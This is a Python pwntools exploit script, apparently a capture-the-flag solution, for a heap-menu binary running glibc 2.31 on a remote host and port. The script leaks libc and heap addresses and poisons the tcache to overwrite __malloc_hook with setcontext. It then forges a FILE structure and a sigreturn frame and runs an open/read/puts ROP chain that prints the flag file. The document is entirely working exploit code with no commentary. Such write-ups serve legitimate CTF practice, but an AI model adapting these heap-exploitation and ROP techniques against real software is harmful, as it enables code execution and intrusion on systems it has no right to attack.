from pwn import*
context.binary = './main'
def menu(ch):
	p.sendlineafter('Action>',str(ch))
def new(size,content):
	menu(3)
	p.sendlineafter('price:',str(size))
	p.sendafter('Name:',content)
def load(index):
	menu(2)
	p.sendlineafter('load?',str(index))
def free(times):
	menu(1)
	p.sendlineafter('time: ',str(times))
p = process('./main')
p = remote('123.57.209.176',30772)
libc =ELF('./libc-2.31.so')
p.sendlineafter('Your name: ','FMYY')
for i in range(3):
	new(0x10,'FMYY\n')
new(0x420,'FMYY\n')
new(0x420,'fmyy\n')
new(0x10,'FMYY\n')

load(4)
load(3)
free(2)

new(0x20,'\n')
load(3)
free(1)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 0x70 - 0x120 - 0x3E0
log.info('LIBC:\t' + hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
malloc_hook = libc_base + libc.sym['__malloc_hook']
new(0x20,'F'*0x10 + '\n')
load(3)
free(1)
p.recvuntil('F'*0x10)
heap_base = u64(p.recv(6).ljust(8,'\x00')) - 0x2C0 - 0x60
log.info('HEAP:\t' + hex(heap_base))
#############################################

###########3
pop_rdi_ret = libc_base + 0x0000000000026B72
pop_rdx_r12 = libc_base + 0x000000000011C371
pop_rsi_ret = libc_base + 0x0000000000027529
pop_rax_ret = libc_base + 0x000000000004A550
jmp_rsi  = libc_base + 0x000000000013927D


syscall = libc_base + libc.sym['syscall']

target = libc_base + libc.sym['_IO_2_1_stdin_']
address = libc.sym['__free_hook'] + libc_base
IO_str_jumps = libc_base + 0x1ED560

Open = libc_base + libc.symbols["open"]
Read = libc_base + libc.symbols["read"]
Puts = libc_base + libc.symbols['puts']
free_hook = address
IO  = '\x00'*0x28
IO += p64(heap_base + 0x360 + 0xE0)
IO  = IO.ljust(0xD8,'\x00')
IO += p64(IO_str_jumps)
read = libc_base + libc.sym['read']
frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = address
frame.rdx = 0x2000
frame.rsp = address
frame.rip = Read


orw  = p64(pop_rdi_ret)+p64(free_hook + 0xF8)
orw += p64(pop_rsi_ret)+p64(0)
orw += p64(Open)
orw += p64(pop_rdi_ret) + p64(3)
orw += p64(pop_rdx_r12) + p64(0x30) + p64(0)
orw += p64(pop_rsi_ret) + p64(free_hook+0x100)
orw += p64(Read)
orw += p64(pop_rdi_ret)+p64(free_hook+0x100)
orw += p64(Puts)
orw  = orw.ljust(0xF8,'\x00')
orw += './flag\x00\x00'
IO += str(frame)
########################################
for i in range(3):
	load(i)
free(3)
new(0x3E0,IO + '\n')
new(0x31,p64(0) + p64(0x21) + '\x00'*0x18 + p64(0x21) + '\n')
free(1)

load(1)
free(1)
new(0x31,p64(0) + p64(0x21) + p64(libc_base + libc.sym['_IO_2_1_stderr_'] + 0x68) + '\n')
new(0x10,'FMYY\n')
new(0x10,p64(heap_base + 0x360) + '\n')

load(1)
load(2)
free(2)

new(0x31,p64(0) + p64(0x21) + p64(malloc_hook) + '\n')
new(0x10,'FMYY\n')
new(0x10,p64(libc_base + libc.sym['setcontext'] + 61) + '\n')

menu(4)
p.sendlineafter('Goodbye!',orw)
p.interactive()
